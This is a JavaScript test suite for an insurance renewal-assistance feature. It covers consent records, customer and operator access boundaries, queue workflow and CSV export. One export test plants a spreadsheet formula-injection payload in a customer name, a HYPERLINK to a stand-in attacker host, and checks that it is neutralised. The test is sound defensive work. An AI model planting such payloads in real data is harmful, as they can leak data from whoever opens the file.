/**
 * "Help me renew", end to end: the customer's side and the operator's.
 *
 * The property that decides whether this is safe to ship is the boundary
 * between those two sides. A customer may raise a request and stop it; they may
 * not see the queue, move somebody's request along, or export anybody. An
 * operator may work the queue; they may not manufacture a consent or reach past
 * the workflow. Most of this file is that boundary, from both directions.
 *
 * The rest is the consent record itself — that it exists before the request,
 * that withdrawing preserves it rather than deleting it, and that withdrawing
 * does not quietly erase the request it was given for.
 */
process.env.NODE_ENV = "test";
process.env.JWT_SECRET = "test-only-signing-key-not-used-anywhere-real-0123456789";
process.env.RL_AUTH_MAX = "2000";
process.env.RL_API_MAX = "5000";
process.env.CLIENT_URL = "http://localhost:3000";

const path = require("path");
const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");

const dbFile = path.join(os.tmpdir(), `aegis-renewal-lead-${Date.now()}-${process.pid}.db`);
process.env.DATABASE_URL = `file:${dbFile}`;
execSync("npx prisma migrate deploy", { stdio: "ignore" });

const assert = require("node:assert/strict");
const { test, describe, after, before } = require("node:test");
const request = require("supertest");
const app = require("../src/app");
const { PrismaClient } = require("@prisma/client");
const { consentTextHash } = require("../src/consumer/consentHash");
const { CONSENT_TEXT_VERSION } = require("../src/consumer/messages");

const prisma = new PrismaClient();
const ORIGIN = "http://localhost:3000";
const PASSWORD = "correct-horse-battery";
const CONSUMER = "/api/v1/consumer";
const QUEUE = "/api/v1/renewal-leads";

after(async () => {
  await prisma.$disconnect();
  for (const f of [dbFile, `${dbFile}-journal`]) {
    try { fs.unlinkSync(f); } catch { /* ignore */ }
  }
});

const cookieHeader = (res) =>
  (res.headers["set-cookie"] || []).map((c) => c.split(";")[0]).join("; ");

let seq = 0;

/** A customer. Public registration is always `customer` — see SECURITY.md. */
async function account(tag) {
  seq += 1;
  const email = `renewal-${tag}-${Date.now()}-${seq}@test.com`;
  const res = await request(app)
    .post("/api/v1/auth/register")
    .set("Origin", ORIGIN)
    .send({ name: `Person ${tag}`, email, password: PASSWORD });
  assert.equal(res.status, 201, `registration failed: ${JSON.stringify(res.body)}`);
  return { cookie: cookieHeader(res), userId: res.body.data.user.id, email };
}

/**
 * Somebody who works the queue.
 *
 * Registered as a customer and then promoted directly in the database, because
 * the API has no route that hands out a staff role — which is itself the
 * behaviour under test elsewhere.
 */
async function staff(tag, role = "EMPLOYEE") {
  const person = await account(tag);
  await prisma.user.update({ where: { id: person.userId }, data: { role } });
  const login = await request(app)
    .post("/api/v1/auth/login")
    .set("Origin", ORIGIN)
    .send({ email: person.email, password: PASSWORD });
  assert.equal(login.status, 200, JSON.stringify(login.body));
  return { ...person, cookie: cookieHeader(login) };
}

const at = (base, cookie) => ({
  get: (p) => request(app).get(`${base}${p}`).set("Cookie", cookie).set("Origin", ORIGIN),
  post: (p) => request(app).post(`${base}${p}`).set("Cookie", cookie).set("Origin", ORIGIN),
  patch: (p) => request(app).patch(`${base}${p}`).set("Cookie", cookie).set("Origin", ORIGIN),
  delete: (p) => request(app).delete(`${base}${p}`).set("Cookie", cookie).set("Origin", ORIGIN),
});

const api = (cookie) => at(CONSUMER, cookie);
const queue = (cookie) => at(QUEUE, cookie);

function dateIn(days) {
  const d = new Date();
  d.setUTCDate(d.getUTCDate() + days);
  return d.toISOString().slice(0, 10);
}

let plate = 0;
async function policyFor(cookie, over = {}) {
  plate += 1;
  const res = await api(cookie).post("/policies").send({
    insurer: "Bharat General Insurance",
    policyNumber: `POL/2026/${String(plate).padStart(6, "0")}`,
    policyType: "COMPREHENSIVE",
    expiryDate: dateIn(20),
    vehicle: { registrationNumber: `TN 09 AB ${2000 + plate}`, vehicleType: "BIKE" },
    ...over,
  });
  assert.equal(res.status, 201, JSON.stringify(res.body));
  return res.body.data.policy;
}

/**
 * The default request: a call, with a number to make it on.
 *
 * The number matters — CALL and WHATSAPP are refused without one, because a
 * queue row saying "ring them" with nothing to ring is a row nobody can work.
 */
const ask = (cookie, policyId, body = {}) =>
  api(cookie)
    .post(`/policies/${policyId}/renewal-request`)
    .send({ preferredChannel: "CALL", contactPhone: "+91 98400 12345", agreed: true, ...body });

// ── Raising a request ────────────────────────────────────────────────────────

describe("asking for help renewing", () => {
  let cookie;
  before(async () => { ({ cookie } = await account("ask")); });

  test("creates the request and the consent behind it, together", async () => {
    const policy = await policyFor(cookie);
    const res = await ask(cookie, policy.id, { preferredChannel: "WHATSAPP" });

    assert.equal(res.status, 201, JSON.stringify(res.body));
    assert.equal(res.body.data.request.status, "NEW");
    assert.equal(res.body.data.request.preferredChannel, "WHATSAPP");

    const consents = await api(cookie).get("/consents");
    const live = consents.body.data.consents.filter((c) => c.active);
    assert.equal(live.length, 1);
    assert.equal(live[0].channel, "WHATSAPP");
    assert.equal(live[0].purpose, "RENEWAL_ASSISTANCE");
  });

  test("the request cannot exist without a consent attached to it", async () => {
    const policy = await policyFor(cookie);
    const res = await ask(cookie, policy.id);
    const row = await prisma.renewalLead.findUnique({ where: { id: res.body.data.request.id } });
    assert.ok(row.consentId, "a request was stored with no consent behind it");
  });

  test("it will not proceed without an explicit agreement", async () => {
    const policy = await policyFor(cookie);

    for (const agreed of [undefined, false, "true", 1, null]) {
      const res = await api(cookie)
        .post(`/policies/${policy.id}/renewal-request`)
        .send({ preferredChannel: "CALL", ...(agreed === undefined ? {} : { agreed }) });
      assert.equal(res.status, 400, `agreed=${JSON.stringify(agreed)} was accepted`);
    }
  });

  test("it will not proceed without a channel it recognises", async () => {
    const policy = await policyFor(cookie);
    for (const channel of ["SMS", "call", "", undefined]) {
      const res = await api(cookie)
        .post(`/policies/${policy.id}/renewal-request`)
        .send({ agreed: true, ...(channel === undefined ? {} : { preferredChannel: channel }) });
      assert.equal(res.status, 400, `channel=${JSON.stringify(channel)} was accepted`);
    }
  });

  test("a call or a message needs a number to make it on", async () => {
    // A queue row saying "ring them" with nothing to ring is a row nobody can
    // work, and the customer would be left waiting for a call that never comes.
    const policy = await policyFor(cookie);
    for (const channel of ["CALL", "WHATSAPP"]) {
      const res = await api(cookie)
        .post(`/policies/${policy.id}/renewal-request`)
        .send({ preferredChannel: channel, agreed: true });
      assert.equal(res.status, 400, channel);
      assert.match(res.body.message, /number/i);
    }
  });

  test("it says to choose email instead, rather than only refusing", async () => {
    const policy = await policyFor(cookie);
    const res = await api(cookie)
      .post(`/policies/${policy.id}/renewal-request`)
      .send({ preferredChannel: "CALL", contactPhone: "123", agreed: true });
    assert.equal(res.status, 400);
    assert.match(res.body.message, /choose email instead/i);
  });

  test("email needs no number at all", async () => {
    const policy = await policyFor(cookie);
    const res = await api(cookie)
      .post(`/policies/${policy.id}/renewal-request`)
      .send({ preferredChannel: "EMAIL", agreed: true });
    assert.equal(res.status, 201, JSON.stringify(res.body));
  });

  test("a number is taken as it was typed, punctuation and all", async () => {
    // Numbers arrive with spaces, dashes, a country code or none. Turning away
    // a real number because of its punctuation is how this loses people.
    const policy = await policyFor(cookie);
    const res = await ask(cookie, policy.id, { contactPhone: "044-2841 9000" });
    assert.equal(res.status, 201, JSON.stringify(res.body));
    const row = await prisma.renewalLead.findUnique({ where: { id: res.body.data.request.id } });
    assert.equal(row.contactPhone, "044-2841 9000");
  });

  test("the number never reaches the audit trail", async () => {
    // The trail records that somebody asked for help, not how to telephone them.
    const rows = await prisma.auditLog.findMany({
      where: { action: "consumer.renewalRequest.created" },
    });
    assert.ok(rows.length > 0);
    for (const row of rows) {
      assert.ok(!/98400|2841/.test(JSON.stringify(row)), JSON.stringify(row));
    }
  });

  test("the urgency and expiry are snapshotted, not looked up later", async () => {
    // A request raised at twenty days was urgent when it was raised. A queue
    // that silently re-sorts as dates pass cannot answer "why was this missed".
    const policy = await policyFor(cookie, { expiryDate: dateIn(5) });
    const res = await ask(cookie, policy.id);
    // Five days out is the engine's URGENT band, which the queue sorts as HIGH.
    assert.equal(res.body.data.request.urgencyAtCreation, "HIGH");
    assert.equal(res.body.data.request.expiryAtCreation, dateIn(5));
  });

  test("a policy that may already have lapsed is raised at the top of the queue", async () => {
    const policy = await policyFor(cookie, { expiryDate: dateIn(-3) });
    const res = await ask(cookie, policy.id);
    assert.equal(res.body.data.request.urgencyAtCreation, "CRITICAL");
  });

  test("asking twice for the same policy does not put two rows in the queue", async () => {
    // A repeated tap on a slow connection must not reach two different operators.
    const policy = await policyFor(cookie);
    const first = await ask(cookie, policy.id);
    const second = await ask(cookie, policy.id);

    assert.equal(first.status, 201);
    assert.equal(second.status, 200, "the second should not report a creation");
    assert.equal(second.body.data.request.id, first.body.data.request.id);
    assert.equal(second.body.data.alreadyOpen, true);
  });

  test("the reminder is a separate agreement, taken only when given", async () => {
    const { cookie: fresh } = await account("remind");
    const policy = await policyFor(fresh);
    await ask(fresh, policy.id, { alsoRemind: true });

    const consents = await api(fresh).get("/consents");
    const purposes = consents.body.data.consents.map((c) => c.purpose).sort();
    assert.deepEqual(purposes, ["RENEWAL_ASSISTANCE", "RENEWAL_REMINDER"]);
  });

  test("not asking for reminders leaves no reminder consent behind", async () => {
    const { cookie: fresh } = await account("no-remind");
    const policy = await policyFor(fresh);
    await ask(fresh, policy.id);

    const consents = await api(fresh).get("/consents");
    assert.deepEqual(consents.body.data.consents.map((c) => c.purpose), ["RENEWAL_ASSISTANCE"]);
  });

  test("the customer is told what happens next, and that they can stop it", async () => {
    const policy = await policyFor(cookie);
    const res = await ask(cookie, policy.id);
    assert.match(res.body.data.message, /get in touch/i);
    assert.match(res.body.data.message, /stop this at any time/i);
    assert.ok(res.body.data.disclaimer.length > 0, "the guidance disclaimer travels with it");
  });

  test("it answers in Tamil when asked to", async () => {
    const policy = await policyFor(cookie);
    const res = await api(cookie)
      .post(`/policies/${policy.id}/renewal-request?locale=ta`)
      .send({ preferredChannel: "EMAIL", agreed: true });
    assert.equal(res.status, 201);
    assert.match(res.body.data.message, /[஀-௿]/);
  });

  test("fields the customer is not allowed to set are refused outright", async () => {
    const policy = await policyFor(cookie);
    const res = await api(cookie).post(`/policies/${policy.id}/renewal-request`).send({
      preferredChannel: "CALL",
      agreed: true,
      status: "CLOSED",
      urgencyAtCreation: "NONE",
      assignedToId: "somebody",
    });
    assert.equal(res.status, 400);
    assert.match(res.body.message, /cannot be set here/i);
  });
});

// ── The consent record ───────────────────────────────────────────────────────

describe("the consent record", () => {
  let cookie;
  before(async () => { ({ cookie } = await account("consent")); });

  test("stores the wording it showed, by version and by hash", async () => {
    const res = await api(cookie)
      .post("/consents")
      .send({ channel: "EMAIL", purpose: "RENEWAL_ASSISTANCE" });
    assert.equal(res.status, 201);

    const row = await prisma.renewalConsent.findUnique({ where: { id: res.body.data.consent.id } });
    assert.equal(row.textVersion, CONSENT_TEXT_VERSION);
    assert.equal(row.textHash, consentTextHash("RENEWAL_ASSISTANCE"));
  });

  test("the wording is never taken from the client", async () => {
    // Otherwise the record would say whatever the sender liked, and the hash
    // would prove only that they had sent it.
    const res = await api(cookie).post("/consents").send({
      channel: "CALL",
      purpose: "RENEWAL_ASSISTANCE",
      textVersion: "attacker-v9",
      textHash: "0".repeat(64),
    });
    assert.equal(res.status, 400);
    assert.match(res.body.message, /cannot be set here/i);
  });

  test("records where and how it was given", async () => {
    const res = await request(app)
      .post(`${CONSUMER}/consents`)
      .set("Cookie", cookie)
      .set("Origin", ORIGIN)
      .set("User-Agent", "AegisTest/1.0")
      .send({ channel: "WHATSAPP", purpose: "RENEWAL_REMINDER" });

    const row = await prisma.renewalConsent.findUnique({ where: { id: res.body.data.consent.id } });
    assert.equal(row.userAgent, "AegisTest/1.0");
    assert.ok(row.ipAddress, "the address it came from is part of the proof");
  });

  test("agreeing again to something live is not a second agreement", async () => {
    const first = await api(cookie).post("/consents").send({ channel: "EMAIL", purpose: "RENEWAL_REMINDER" });
    const again = await api(cookie).post("/consents").send({ channel: "EMAIL", purpose: "RENEWAL_REMINDER" });
    assert.equal(again.body.data.consent.id, first.body.data.consent.id);
  });

  test("withdrawing keeps the row and dates the withdrawal", async () => {
    const granted = await api(cookie).post("/consents").send({ channel: "CALL", purpose: "RENEWAL_REMINDER" });
    const id = granted.body.data.consent.id;

    const res = await api(cookie).delete(`/consents/${id}`);
    assert.equal(res.status, 200);
    assert.equal(res.body.data.consent.active, false);
    assert.ok(res.body.data.consent.withdrawnAt);
    assert.match(res.body.data.message, /policy details are untouched/i);

    const row = await prisma.renewalConsent.findUnique({ where: { id } });
    assert.ok(row, "a withdrawn consent must survive as a record");
    assert.ok(row.withdrawnAt);
  });

  test("withdrawing twice keeps the first date, which is the true one", async () => {
    const granted = await api(cookie).post("/consents").send({ channel: "WHATSAPP", purpose: "RENEWAL_ASSISTANCE" });
    const id = granted.body.data.consent.id;

    const first = await api(cookie).delete(`/consents/${id}`);
    const second = await api(cookie).delete(`/consents/${id}`);
    assert.equal(second.status, 200);
    assert.equal(second.body.data.consent.withdrawnAt, first.body.data.consent.withdrawnAt);
  });

  test("withdrawing one channel does not withdraw the others", async () => {
    const { cookie: fresh } = await account("channels");
    const call = await api(fresh).post("/consents").send({ channel: "CALL", purpose: "RENEWAL_ASSISTANCE" });
    await api(fresh).post("/consents").send({ channel: "EMAIL", purpose: "RENEWAL_ASSISTANCE" });

    await api(fresh).delete(`/consents/${call.body.data.consent.id}`);

    const list = await api(fresh).get("/consents");
    const live = list.body.data.consents.filter((c) => c.active);
    assert.deepEqual(live.map((c) => c.channel), ["EMAIL"]);
  });

  test("the list shows what was stopped as well as what stands", async () => {
    const list = await api(cookie).get("/consents");
    assert.ok(list.body.data.consents.some((c) => !c.active), "withdrawn consents must still be visible");
  });

  test("both actions are on the audit trail, and neither carries the wording", async () => {
    const rows = await prisma.auditLog.findMany({
      where: { action: { in: ["consumer.consent.granted", "consumer.consent.withdrawn"] } },
    });
    assert.ok(rows.some((r) => r.action === "consumer.consent.granted"));
    assert.ok(rows.some((r) => r.action === "consumer.consent.withdrawn"));
    for (const row of rows) {
      assert.ok(!/I would like someone/i.test(JSON.stringify(row)), "the trail should carry a version, not an essay");
    }
  });
});

// ── One customer cannot reach another ────────────────────────────────────────

describe("one customer cannot reach another's request", () => {
  let mine;
  let theirs;
  let myRequestId;
  let myConsentId;

  before(async () => {
    mine = await account("owner");
    theirs = await account("stranger");
    const policy = await policyFor(mine.cookie);
    const res = await ask(mine.cookie, policy.id);
    myRequestId = res.body.data.request.id;
    const consents = await api(mine.cookie).get("/consents");
    myConsentId = consents.body.data.consents[0].id;
  });

  test("asking for help on somebody else's policy reports it as absent", async () => {
    const policy = await policyFor(theirs.cookie);
    const res = await ask(mine.cookie, policy.id);
    assert.equal(res.status, 404);
  });

  test("their request list does not contain mine", async () => {
    const res = await api(theirs.cookie).get("/renewal-requests");
    assert.equal(res.status, 200);
    assert.ok(!res.body.data.requests.some((r) => r.id === myRequestId));
  });

  test("they cannot withdraw my consent", async () => {
    const res = await api(theirs.cookie).delete(`/consents/${myConsentId}`);
    assert.equal(res.status, 404);

    const row = await prisma.renewalConsent.findUnique({ where: { id: myConsentId } });
    assert.equal(row.withdrawnAt, null, "a stranger's request must not have withdrawn it");
  });

  test("their consent list does not contain mine", async () => {
    const res = await api(theirs.cookie).get("/consents");
    assert.ok(!res.body.data.consents.some((c) => c.id === myConsentId));
  });

  test("signing out closes the door entirely", async () => {
    for (const p of ["/renewal-requests", "/consents"]) {
      const res = await request(app).get(`${CONSUMER}${p}`).set("Origin", ORIGIN);
      assert.equal(res.status, 401, p);
    }
  });
});

// ── The queue is not for customers ───────────────────────────────────────────

describe("the queue is walled off from the people in it", () => {
  let customer;
  let operator;
  let leadId;

  before(async () => {
    customer = await account("queue-customer");
    operator = await staff("queue-operator");
    const policy = await policyFor(customer.cookie);
    const res = await ask(customer.cookie, policy.id);
    leadId = res.body.data.request.id;
  });

  test("a customer cannot read the queue, not even to find their own row", async () => {
    // Their own request is readable through /consumer/renewal-requests. The
    // queue carries other people's contact details and is a different question.
    const res = await queue(customer.cookie).get("/");
    assert.equal(res.status, 403);
  });

  test("a customer cannot read one request from it", async () => {
    const res = await queue(customer.cookie).get(`/${leadId}`);
    assert.equal(res.status, 403);
  });

  test("a customer cannot move their own request along", async () => {
    // Marking your own request Contacted would make the queue a fiction.
    const res = await queue(customer.cookie).patch(`/${leadId}`).send({ status: "CONTACTED" });
    assert.equal(res.status, 403);

    const row = await prisma.renewalLead.findUnique({ where: { id: leadId } });
    assert.equal(row.status, "NEW");
  });

  test("a customer cannot export anybody", async () => {
    const res = await queue(customer.cookie).get("/?format=csv");
    assert.equal(res.status, 403);
    assert.ok(!String(res.headers["content-type"] ?? "").includes("csv"));
  });

  test("signing out closes it too", async () => {
    const res = await request(app).get(`${QUEUE}/`).set("Origin", ORIGIN);
    assert.equal(res.status, 401);
  });

  test("an operator holding the capability can read it", async () => {
    const res = await queue(operator.cookie).get("/");
    assert.equal(res.status, 200, JSON.stringify(res.body));
    assert.ok(res.body.data.leads.some((l) => l.id === leadId));
  });
});

// ── Working the queue ────────────────────────────────────────────────────────

describe("working the queue", () => {
  let customer;
  let operator;
  let leadId;

  before(async () => {
    customer = await account("work-customer");
    operator = await staff("work-operator");
    const policy = await policyFor(customer.cookie);
    leadId = (
      await ask(customer.cookie, policy.id, {
        preferredChannel: "WHATSAPP",
        contactPhone: "+91 98400 55555",
      })
    ).body.data.request.id;
  });

  test("a row carries enough to actually make contact", async () => {
    // The whole point of the queue. An operator who has to open two more
    // screens to find a number will ring the easy ones and leave the rest.
    const res = await queue(operator.cookie).get(`/${leadId}`);
    assert.equal(res.status, 200);
    const lead = res.body.data.lead;
    assert.equal(lead.customer.email, customer.email);
    assert.equal(lead.customer.phone, "+91 98400 55555");
    assert.equal(lead.preferredChannel, "WHATSAPP");
    assert.equal(lead.consentActive, true);
    assert.ok(lead.policy.registrationNumber);
  });

  test("it never carries the whole policy number", async () => {
    // An export leaves the platform; a queue is read by everyone in operations.
    // Neither needs the number printed on somebody's certificate.
    const res = await queue(operator.cookie).get(`/${leadId}`);
    assert.match(res.body.data.lead.policy.policyNumberMasked, /^•+\d{4}$/);
    assert.ok(!JSON.stringify(res.body).includes("POL/2026/"));
  });

  test("a new request cannot be closed in one click", async () => {
    const res = await queue(operator.cookie)
      .patch(`/${leadId}`)
      .send({ status: "CLOSED", closedReason: "UNREACHABLE" });
    assert.equal(res.status, 409);
    assert.match(res.body.message, /Contacted first/i);
  });

  test("it walks the workflow the specification names", async () => {
    for (const status of ["CONTACTED", "QUOTE_REQUESTED", "PARTNER_HANDOFF"]) {
      const res = await queue(operator.cookie).patch(`/${leadId}`).send({ status });
      assert.equal(res.status, 200, `${status}: ${JSON.stringify(res.body)}`);
      assert.equal(res.body.data.lead.status, status);
    }
  });

  test("whoever moves it first picks it up", async () => {
    const res = await queue(operator.cookie).get(`/${leadId}`);
    assert.equal(res.body.data.lead.assignedToId, operator.userId);
  });

  test("closing needs a reason", async () => {
    const res = await queue(operator.cookie).patch(`/${leadId}`).send({ status: "CLOSED" });
    assert.equal(res.status, 400);
    assert.match(res.body.message, /why this is being closed/i);
  });

  test("a reason outside the counted set is refused", async () => {
    const res = await queue(operator.cookie)
      .patch(`/${leadId}`)
      .send({ status: "CLOSED", closedReason: "they were rude" });
    assert.equal(res.status, 400);
  });

  test("closing with a reason finishes it, and closing is final", async () => {
    const closed = await queue(operator.cookie)
      .patch(`/${leadId}`)
      .send({ status: "CLOSED", closedReason: "RENEWED_WITH_PARTNER" });
    assert.equal(closed.status, 200);
    assert.equal(closed.body.data.lead.closedReason, "RENEWED_WITH_PARTNER");

    const reopen = await queue(operator.cookie).patch(`/${leadId}`).send({ status: "CONTACTED" });
    assert.equal(reopen.status, 409);
    assert.match(reopen.body.message, /raise a new request/i);
  });

  test("a request cannot be moved backwards", async () => {
    const other = await account("backwards");
    const policy = await policyFor(other.cookie);
    const id = (await ask(other.cookie, policy.id)).body.data.request.id;

    await queue(operator.cookie).patch(`/${id}`).send({ status: "CONTACTED" });
    const back = await queue(operator.cookie).patch(`/${id}`).send({ status: "NEW" });
    assert.equal(back.status, 409);
  });

  test("fields an operator has no business setting are refused", async () => {
    const other = await account("fields");
    const policy = await policyFor(other.cookie);
    const id = (await ask(other.cookie, policy.id)).body.data.request.id;

    const res = await queue(operator.cookie).patch(`/${id}`).send({
      status: "CONTACTED",
      userId: operator.userId,
      consentId: "forged",
      urgencyAtCreation: "NONE",
      deletedAt: new Date().toISOString(),
    });
    assert.equal(res.status, 400);
    assert.match(res.body.message, /cannot be set here/i);
  });

  test("every move is on the audit trail, with both ends of it", async () => {
    // "Changed to CLOSED" alone cannot answer whether the workflow was followed.
    const rows = await prisma.auditLog.findMany({ where: { action: "renewalLead.advanced" } });
    assert.ok(rows.length > 0);
    const closing = rows.find((r) => JSON.stringify(r).includes("RENEWED_WITH_PARTNER"));
    assert.ok(closing, "the closing reason should be on the trail");
    const meta = typeof closing.metadata === "string" ? JSON.parse(closing.metadata) : closing.metadata;
    assert.equal(meta.from, "PARTNER_HANDOFF");
    assert.equal(meta.to, "CLOSED");
  });

  test("a request that does not exist reports as absent", async () => {
    const res = await queue(operator.cookie).patch("/11111111-1111-4111-8111-111111111111").send({
      status: "CONTACTED",
    });
    assert.equal(res.status, 404);
  });
});

// ── Withdrawal, seen from the queue ──────────────────────────────────────────

describe("when a customer changes their mind", () => {
  let customer;
  let operator;
  let leadId;

  before(async () => {
    customer = await account("withdraw");
    operator = await staff("withdraw-operator");
    const policy = await policyFor(customer.cookie);
    leadId = (await ask(customer.cookie, policy.id)).body.data.request.id;
  });

  test("the queue stops showing a live consent", async () => {
    const before = await queue(operator.cookie).get(`/${leadId}`);
    assert.equal(before.body.data.lead.consentActive, true);

    const consents = await api(customer.cookie).get("/consents");
    const assistance = consents.body.data.consents.find((c) => c.purpose === "RENEWAL_ASSISTANCE");
    await api(customer.cookie).delete(`/consents/${assistance.id}`);

    const after = await queue(operator.cookie).get(`/${leadId}`);
    assert.equal(after.body.data.lead.consentActive, false);
  });

  test("the request itself stays on the record", async () => {
    // Silently closing it would erase the fact that they asked, which is the
    // thing anybody reviewing this afterwards needs to see.
    const res = await queue(operator.cookie).get(`/${leadId}`);
    assert.equal(res.status, 200);
    assert.equal(res.body.data.lead.status, "NEW");
  });
});

// ── Export ───────────────────────────────────────────────────────────────────

describe("exporting the queue", () => {
  let operator;
  before(async () => { operator = await staff("export-operator"); });

  test("comes back as a CSV download with a filename we chose", async () => {
    const res = await queue(operator.cookie).get("/?format=csv");
    assert.equal(res.status, 200);
    assert.match(res.headers["content-type"], /text\/csv/);
    assert.match(res.headers["content-disposition"], /^attachment; filename="aegis-renewal-requests-\d{4}-\d{2}-\d{2}\.csv"$/);
  });

  test("has a header row and the columns an operator needs", async () => {
    const res = await queue(operator.cookie).get("/?format=csv");
    const [header] = res.text.split("\n");
    for (const column of ["Status", "Urgency", "Contact by", "Consent live", "Customer", "Email"]) {
      assert.ok(header.includes(`"${column}"`), `${column} is missing from the export`);
    }
  });

  test("masks the policy number there too", async () => {
    const res = await queue(operator.cookie).get("/?format=csv");
    assert.ok(!res.text.includes("POL/2026/"), "a full policy number left the platform");
  });

  test("a name that would run as a formula is defused", async () => {
    // A spreadsheet evaluates a cell opening with `=` however it was quoted, so
    // a customer's own name becomes an exfiltration link the moment somebody
    // opens the file. The platform's own writer handles this; the test is here
    // because this export is the one that carries customer-supplied names.
    const victim = await account("formula");
    await prisma.user.update({
      where: { id: victim.userId },
      data: { name: '=HYPERLINK("https://evil.example","Click")' },
    });
    const policy = await policyFor(victim.cookie);
    await ask(victim.cookie, policy.id);

    const res = await queue(operator.cookie).get("/?format=csv");
    assert.ok(res.text.includes(`"'=HYPERLINK`), "the formula lead was not neutralised");
    assert.ok(!res.text.includes('"=HYPERLINK'), "a live formula reached the file");
  });

  test("filters the same way the screen does", async () => {
    const everything = await queue(operator.cookie).get("/?format=csv");
    const closedOnly = await queue(operator.cookie).get("/?format=csv&status=CLOSED");
    assert.equal(closedOnly.status, 200);

    // A filter that was quietly ignored would hand somebody the whole queue
    // when they asked for one slice of it.
    const rows = (text) => text.trim().split("\n").slice(1);
    assert.ok(rows(everything.text).length > rows(closedOnly.text).length);
    for (const row of rows(closedOnly.text)) {
      assert.ok(row.includes('"Closed"'), row);
    }
  });

  test("a filter matching nothing exports nothing, rather than everything", async () => {
    const none = await queue(operator.cookie).get("/?format=csv&channel=EMAIL&status=PARTNER_HANDOFF");
    assert.equal(none.status, 200);
    assert.equal(none.text.trim(), "");
  });

  test("an unknown filter is refused rather than ignored", async () => {
    const res = await queue(operator.cookie).get("/?status=WON");
    assert.equal(res.status, 400);
  });

  test("the export is recorded as its own action", async () => {
    // It leaves the platform and stops being governed by it, which makes it a
    // different event from reading the screen.
    const rows = await prisma.auditLog.findMany({ where: { action: "renewalLead.exported" } });
    assert.ok(rows.length > 0, "an export should be on the audit trail");
  });
});
